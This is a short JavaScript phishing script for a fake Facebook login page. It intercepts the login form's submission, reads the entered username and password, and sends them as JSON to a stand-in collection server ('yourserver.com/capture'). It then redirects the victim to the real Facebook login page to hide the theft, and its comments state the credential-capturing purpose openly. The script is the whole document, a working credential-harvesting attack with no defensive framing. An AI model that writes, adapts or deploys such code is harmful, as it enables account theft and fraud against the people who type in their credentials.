document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission

    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Send captured username and password to your server or email address
    // Example: You can use Fetch API to send data to your server
    fetch("http://yourserver.com/capture", {
        method: "POST",
        body: JSON.stringify({ username: username, password: password }),
        headers: {
            "Content-Type": "application/json"
        }
    })
    .then(response => {
        if (response.ok) {
            // Redirect the victim to the real Facebook login page
            window.location.replace("https://www.facebook.com/login.php");
        } else {
            console.error("Error capturing credentials:", response.statusText);
            alert("Error capturing credentials. Please try again later.");
        }
    })
    .catch(error => {
        console.error("Error capturing credentials:", error);
        alert("Error capturing credentials. Please try again later.");
    });
});
